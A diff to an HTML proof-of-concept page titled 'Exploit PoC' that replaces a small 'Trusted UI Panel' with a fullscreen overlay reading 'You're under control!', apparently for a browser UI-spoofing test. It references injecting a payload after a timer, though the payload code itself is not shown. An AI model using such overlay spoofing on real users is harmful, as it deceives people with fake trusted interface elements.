@@ -2,17 +2,47 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Exploit PoC - Aggressive Version</title>
+<title>Exploit PoC - Fullscreen Overlay</title>
 <style>
-  #panel {
-    display: none;
+  body {
+    margin: 0;
+    padding: 0;
+    overflow: hidden; /* Mencegah scroll */
+  }
+
+  #overlay {
     position: fixed;
-    top: 20%;
-    left: 30%;
-    padding: 20px;
-    background: #fff;
-    border: 2px solid #000;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.9); /* Warna overlay */
+    display: none; /* Default tidak ditampilkan */
     z-index: 9999;
+    color: #fff;
+    text-align: center;
+    font-size: 24px;
+    padding: 20px;
+  }
+
+  #overlay p {
+    margin-top: 20%;
+    font-size: 36px;
+    font-weight: bold;
+  }
+
+  #overlay button {
+    padding: 10px 20px;
+    font-size: 20px;
+    margin-top: 30px;
+    background-color: #ff0000;
+    color: #fff;
+    border: none;
+    cursor: pointer;
+  }
+
+  #overlay button:hover {
+    background-color: #cc0000;
   }
 </style>
 </head>
@@ -21,8 +51,10 @@
 
 <button onclick="foo()">GO</button>
 
-<div id="panel">
-  <p>Trusted UI Panel</p>
+<!-- Overlay Panel -->
+<div id="overlay">
+  <p>You're under control!</p>
+  <button onclick="closeOverlay()">Close</button>
 </div>
 
 <script>
@@ -50,6 +82,11 @@ function bar() {
             test();
         }, 500);  // Inject payload after 0.5 seconds
     }
+}
+
+// Function to close the overlay
+function closeOverlay() {
+    document.getElementById('overlay').style.display = 'none';  // Hide overlay
 }
 
 window.addEventListener('pageshow', () => {
